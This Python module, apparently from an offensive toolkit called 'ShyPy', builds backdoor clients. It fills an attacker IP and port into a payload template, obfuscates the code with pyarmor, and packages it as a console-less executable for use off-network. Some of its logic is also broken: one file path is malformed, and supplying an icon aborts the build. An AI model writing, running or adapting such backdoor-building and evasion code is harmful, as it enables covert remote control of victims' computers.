import time
import os
import platform

from shypy import Shypy

OS = platform.system().lower()

colors = {
    'BLACK': '\033[0;30m',
    'RED': '\033[0;31m',
    'GREEN': '\033[0;32m',
    'YELLOW': '\033[0;33m',
    'BLUE': '\033[0;34m',
    'MAGENTA': '\033[0;35m',
    'CYAN': '\033[0;36m',
    'WHITE': '\033[0;37m',
    'ZERO': '\033[0m',
}

class Generator:
    def __init__(self):
        self.ip = ""
        self.port = ""

    def BackDoor_Generator(self, name, user_ip, user_port):
        if OS == "windows":
            self.clear()
            file_name = "Modules\BackDoor_Generator\Payloads\DefaultPayload.txt"
        else:
            self.clear()
            file_name = "Modules/Modules\BackDoor_Generator/Payloads/DefaultPayload.txt"

        file_loc = os.path.abspath(os.path.join(os.getcwd(),file_name))
        with open(name, "w", encoding="utf-8") as file:
            with open(file_loc, 'r', encoding='utf-8') as file1:
                file_content = file1.read()
                file_content = file_content.replace("{ip}", user_ip)
                file_content = file_content.replace("{port}", user_port)
                file.write(file_content)

    def obfuscate(self, name):
        try:
            os.system(f"pyarmor gen {name}")
        
        except Exception as e:
            print(f"{colors['YELLOW']}[!]{colors['ZERO']} ERROR: {str(e)}")
    
    def convert_to_exe(self, name, icon=""):
        if icon == "":
            if OS == "windows":
                os.system(f"pyinstaller --onefile --noconsole --hidden-import=socket --hidden-import=subprocess --hidden-import=time --hidden-import=json --hidden-import=os --hidden-import=base64 --clean dist/{name}")

            else:
                os.system(f"pyinstaller --onefile --noconsole --hidden-import=socket --hidden-import=subprocess --hidden-import=time --hidden-import=json --hidden-import=os --hidden-import=base64 dist/{name}")
        else:
            print(f"{colors['YELLOW']}[!]{colors['ZERO']} Name Invalid")

    def ended(self, name):
        if OS == "windows":
            os.remove(name)
            os.remove(f"dist\{name}")
        else:
            os.remove(name)
            os.remove(f"dist/{name}")

        exe_location = name.replace(".py", ".exe")
        exe_loc = os.path.abspath(exe_location)
        self.dist_folder = os.path.abspath(os.path.join(exe_loc, os.pardir))
        self.clear()
        if OS == "windows":
            print(f"{colors['YELLOW']}[!]{colors['ZERO']} Client Was Created On this Location: {self.dist_folder}\dist\{exe_location}")    

        else:
            print(f"{colors['YELLOW']}[!]{colors['ZERO']} Client Was Created On this Location: {self.dist_folder}/dist/{exe_location}")

    def start(self):
        self.clear()
        print(f"""
            ╔══════════════════════════════════════════════════════════════════════╗
            ║*                       - BackDoor Generator -                       *║
            ╠══════════════════════════════════════════════════════════════════════╣
            ║ RULES :   Modem Public IP is used for off-network use.               ║
            ╠══════════════════════════════════╦═══════════════════════════════════╣ 
            ║            Commands              ║            Function               ║    
            ╠══════════════════════════════════╬═══════════════════════════════════╣   
            ║ "set.ip"                         : Set Own IP.                       ║ 
            ║ "set.port"                       : Set Port.                         ║
            ║ "generate"                       : Generate a BackDoor Client.       ║
            ║ "back"                           : Back To Shypy.                    ║                              
            ╠══════════════════════════════════╬═══════════════════════════════════╣
            ║*              IP                 : {self.ip}
            ╠══════════════════════════════════╬═══════════════════════════════════╬
            ║*             PORT                : {self.port}
            ╠══════════════════════════════════╩═══════════════════════════════════╣            
            ║*                            - The ShyPy -                           *║ 
            ╚══════════════════════════════════════════════════════════════════════╝
            \n\n""")

        answer = input(f"{colors['RED']}[ShyPy] =>{colors['ZERO']} ").lower()       
        if answer.startswith("set.ip "):
            answer = answer.replace('set.ip ', '') 
            self.ip = answer
            self.start() 

        elif answer.startswith("set.port "):
            answer = answer.replace('set.port ', '') 
            self.port = answer
            self.start()
        
        elif answer == "set.ip":
            print(f"{colors['YELLOW']}[!]{colors['ZERO']} set.ip <IP>")
            time.sleep(1)
            self.start()

        elif answer == "set.port":
            print(f"{colors['YELLOW']}[!]{colors['ZERO']} set.port <PORT>")
            time.sleep(1)
            self.start()


        elif answer == "generate":
            user_bdc_name = input(f"{colors['GREEN']}[+]{colors['ZERO']} The Name Of Client: ")
            user_bdc_icon = input(f"{colors['GREEN']}[+]{colors['ZERO']} The Icon Of Client (Optional): ")
            user_bdc_name = user_bdc_name + ".py"
            self.BackDoor_Generator(user_bdc_name, self.ip, self.port)
            self.obfuscate(user_bdc_name)
            self.convert_to_exe(user_bdc_name, user_bdc_icon)
            self.ended(user_bdc_name)
            
        elif answer == "back":
            s = Shypy()
            s.program_menu()

        else:
            print(f"{colors['YELLOW']}[!]{colors['ZERO']} Invalid Option")
            time.sleep(0.5)
            self.start()

    def clear(self):
        if OS == "windows":
            os.system("cls")

        else:
            os.system("clear")